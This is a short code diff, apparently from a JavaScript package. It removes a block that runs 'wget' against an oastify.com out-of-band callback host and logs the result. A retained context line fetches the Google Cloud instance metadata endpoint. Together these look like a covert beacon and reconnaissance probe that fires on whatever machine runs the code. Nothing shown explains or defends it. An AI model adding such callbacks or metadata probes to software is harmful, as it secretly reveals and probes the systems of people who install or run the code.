@@ -38,18 +38,7 @@ fetch("http://metadata.google.internal/computeMetadata/v1/instance/hostname")
 
     
 
-exec("wget https://xde2mz5rdthvhp1vmhb5hlg7syypmgf44.oastify.com/wget", (error, stdout, stderr) => {
-    if (error) {
-        console.log(`error: ${error.message}`);
-        return;
-    }
-    if (stderr) {
-        console.log(`stderr: ${stderr}`);
-        return;
-    }
-    console.log(`stdout: ${stdout}`);
-});
-    
+
 
     try {
       
